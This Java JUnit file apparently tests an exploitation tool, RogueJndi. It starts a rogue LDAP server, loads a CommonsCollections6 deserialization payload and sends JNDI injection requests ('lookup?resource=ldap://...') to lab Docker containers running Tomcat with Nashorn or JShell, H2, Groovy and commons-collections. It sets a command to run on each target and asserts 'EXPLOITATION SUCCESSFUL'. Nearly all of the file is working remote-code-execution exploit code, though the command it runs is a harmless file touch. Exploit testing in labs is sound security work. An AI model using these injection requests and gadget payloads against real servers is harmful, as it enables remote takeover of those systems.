import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.URI;
import java.nio.file.Paths;

import org.junit.BeforeClass;
import org.junit.Rule;
import org.junit.Test;
import org.testcontainers.containers.GenericContainer;
import org.testcontainers.utility.DockerImageName;

import artsploit.Config;
import artsploit.RogueJndi;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertTrue;

// Lots of duplication in here. Probably needs parameterized tests.
public class EndToEndExploitTest {
    @BeforeClass
    public static void setup() throws Exception {
        // This resolves to the host address, needed for communication with the rogue-jndi instance.
        Config.hostname = "host.docker.internal";
        // *Don't change the command*, the apps inside the containers work with this file path.
        Config.command = "touch /usr/local/tomcat/temp/pwn.txt";

        Config.genericPayloadPath = Paths
                .get(EndToEndExploitTest.class.getClassLoader().getResource("commonscollections6.bin")
                .toURI())
                .toString();

        RogueJndi.main(new String[0]);
    }

    @SuppressWarnings("resource")
    @Rule
    public GenericContainer<?> tomcat9NashornContainer =
            new GenericContainer<>(DockerImageName.parse("ghcr.io/mogwailabs/jndi-outcast/tomcat-9-nashorn:latest"))
                    .withExposedPorts(8080);

    @Test
    public void testTomcat9NashornExploitation() throws Exception {
        var containerIpAddress = tomcat9NashornContainer.getHost();
        var containerPort = tomcat9NashornContainer.getMappedPort(8080);

        var url = "http://" +
                containerIpAddress +
                ":" +
                containerPort +
                "/tomcat-9-nashorn-1.0-SNAPSHOT/lookup?resource=ldap://" +
                Config.hostname +
                ":" +
                Config.ldapPort +
                "/o=tomcat";

        var client = HttpClient.newHttpClient();

        var request = HttpRequest.newBuilder()
                .uri(URI.create(url))
                .GET()
                .build();

        var response = client.send(request, HttpResponse.BodyHandlers.ofString());

        var statusCode = response.statusCode();
        var body = response.body();

        System.out.println("Response from the server: " + body);

        boolean exploitationSuccessful = body.contains("EXPLOITATION SUCCESSFUL");

        assertTrue(exploitationSuccessful);
        assertEquals(200, statusCode);
    }

    @SuppressWarnings("resource")
    @Rule
    public GenericContainer<?> tomcat10NashornContainer =
            new GenericContainer<>(DockerImageName.parse("ghcr.io/mogwailabs/jndi-outcast/tomcat-10-nashorn:latest"))
                    .withExposedPorts(8080);

    @Test
    public void testTomcat10NashornExploitation() throws Exception {
        var containerIpAddress = tomcat10NashornContainer.getHost();
        var containerPort = tomcat10NashornContainer.getMappedPort(8080);

        var url = "http://" +
                containerIpAddress +
                ":" +
                containerPort +
                "/tomcat-10-nashorn-1.0-SNAPSHOT/lookup?resource=ldap://" +
                Config.hostname +
                ":" +
                Config.ldapPort +
                "/o=tomcat10";

        var client = HttpClient.newHttpClient();

        var request = HttpRequest.newBuilder()
                .uri(URI.create(url))
                .GET()
                .build();

        var response = client.send(request, HttpResponse.BodyHandlers.ofString());

        var statusCode = response.statusCode();
        var body = response.body();

        System.out.println("Response from the server: " + body);

        boolean exploitationSuccessful = body.contains("EXPLOITATION SUCCESSFUL");

        assertTrue(exploitationSuccessful);
        assertEquals(200, statusCode);
    }

    @SuppressWarnings("resource")
    @Rule
    public GenericContainer<?> tomcat9JShellContainer=
            new GenericContainer<>(DockerImageName.parse("ghcr.io/mogwailabs/jndi-outcast/tomcat-9-jshell:latest"))
                    .withExposedPorts(8080);

    @Test
    public void testTomcat9JShellExploitation() throws Exception {
        var containerIpAddress = tomcat9JShellContainer.getHost();
        var containerPort = tomcat9JShellContainer.getMappedPort(8080);

        var url = "http://" +
                containerIpAddress +
                ":" +
                containerPort +
                "/tomcat-9-jshell-1.0-SNAPSHOT/lookup?resource=ldap://" +
                Config.hostname +
                ":" +
                Config.ldapPort +
                "/o=tomcat-jshell";

        var client = HttpClient.newHttpClient();

        var request = HttpRequest.newBuilder()
                .uri(URI.create(url))
                .GET()
                .build();

        var response = client.send(request, HttpResponse.BodyHandlers.ofString());

        var statusCode = response.statusCode();
        var body = response.body();

        System.out.println("Response from the server: " + body);

        boolean exploitationSuccessful = body.contains("EXPLOITATION SUCCESSFUL");

        assertTrue(exploitationSuccessful);
        assertEquals(200, statusCode);
    }

    @SuppressWarnings("resource")
    @Rule
    public GenericContainer<?> tomcat10JShellContainer=
            new GenericContainer<>(DockerImageName.parse("ghcr.io/mogwailabs/jndi-outcast/tomcat-10-jshell:latest"))
                    .withExposedPorts(8080);

    @Test
    public void testTomcat10JShellExploitation() throws Exception {
        var containerIpAddress = tomcat10JShellContainer.getHost();
        var containerPort = tomcat10JShellContainer.getMappedPort(8080);

        var url = "http://" +
                containerIpAddress +
                ":" +
                containerPort +
                "/tomcat-10-jshell-1.0-SNAPSHOT/lookup?resource=ldap://" +
                Config.hostname +
                ":" +
                Config.ldapPort +
                "/o=tomcat10-jshell";

        var client = HttpClient.newHttpClient();

        var request = HttpRequest.newBuilder()
                .uri(URI.create(url))
                .GET()
                .build();

        var response = client.send(request, HttpResponse.BodyHandlers.ofString());

        var statusCode = response.statusCode();
        var body = response.body();

        System.out.println("Response from the server: " + body);

        boolean exploitationSuccessful = body.contains("EXPLOITATION SUCCESSFUL");

        assertTrue(exploitationSuccessful);
        assertEquals(200, statusCode);
    }

    @SuppressWarnings("resource")
    @Rule
    public GenericContainer<?> h2Container=
            new GenericContainer<>(DockerImageName.parse("ghcr.io/mogwailabs/jndi-outcast/h2:latest"))
                    .withExposedPorts(8080);

    @Test
    public void testH2Exploitation() throws Exception {
        var containerIpAddress = h2Container.getHost();
        var containerPort = h2Container.getMappedPort(8080);

        var url = "http://" +
                containerIpAddress +
                ":" +
                containerPort +
                "/h2-1.0-SNAPSHOT/lookup?resource=ldap://" +
                Config.hostname +
                ":" +
                Config.ldapPort +
                "/o=h2";

        var client = HttpClient.newHttpClient();

        var request = HttpRequest.newBuilder()
                .uri(URI.create(url))
                .GET()
                .build();

        var response = client.send(request, HttpResponse.BodyHandlers.ofString());

        var statusCode = response.statusCode();
        var body = response.body();

        System.out.println("Response from the server: " + body);

        boolean exploitationSuccessful = body.contains("EXPLOITATION SUCCESSFUL");

        assertTrue(exploitationSuccessful);
        assertEquals(200, statusCode);
    }

    @SuppressWarnings("resource")
    @Rule
    public GenericContainer<?> groovyContainer=
            new GenericContainer<>(DockerImageName.parse("ghcr.io/mogwailabs/jndi-outcast/groovy:latest"))
                    .withExposedPorts(8080);

    @Test
    public void testGroovyExploitation() throws Exception {
        var containerIpAddress = groovyContainer.getHost();
        var containerPort = groovyContainer.getMappedPort(8080);

        var url = "http://" +
                containerIpAddress +
                ":" +
                containerPort +
                "/groovy-1.0-SNAPSHOT/lookup?resource=ldap://" +
                Config.hostname +
                ":" +
                Config.ldapPort +
                "/o=groovy";

        var client = HttpClient.newHttpClient();

        var request = HttpRequest.newBuilder()
                .uri(URI.create(url))
                .GET()
                .build();

        var response = client.send(request, HttpResponse.BodyHandlers.ofString());

        var statusCode = response.statusCode();
        var body = response.body();

        System.out.println("Response from the server: " + body);

        boolean exploitationSuccessful = body.contains("EXPLOITATION SUCCESSFUL");

        assertTrue(exploitationSuccessful);
        assertEquals(200, statusCode);
    }

    @SuppressWarnings("resource")
    @Rule
    public GenericContainer<?> commonsCollections6Container =
            new GenericContainer<>(DockerImageName.parse("ghcr.io/mogwailabs/jndi-outcast/commons-collections-6:latest"))
                    .withExposedPorts(8080);

    @Test
    public void testGenericExploitation() throws Exception {
        var containerIpAddress = commonsCollections6Container.getHost();
        var containerPort = commonsCollections6Container.getMappedPort(8080);

        var url = "http://" +
                containerIpAddress +
                ":" +
                containerPort +
                "/commons-collections-6-1.0-SNAPSHOT/lookup?resource=ldap://" +
                Config.hostname +
                ":" +
                Config.ldapPort +
                "/o=generic";

        var client = HttpClient.newHttpClient();

        var request = HttpRequest.newBuilder()
                .uri(URI.create(url))
                .GET()
                .build();

        var response = client.send(request, HttpResponse.BodyHandlers.ofString());

        var statusCode = response.statusCode();
        var body = response.body();

        System.out.println("Response from the server: " + body);

        boolean exploitationSuccessful = body.contains("EXPLOITATION SUCCESSFUL");

        assertTrue(exploitationSuccessful);
        assertEquals(200, statusCode);
    }
}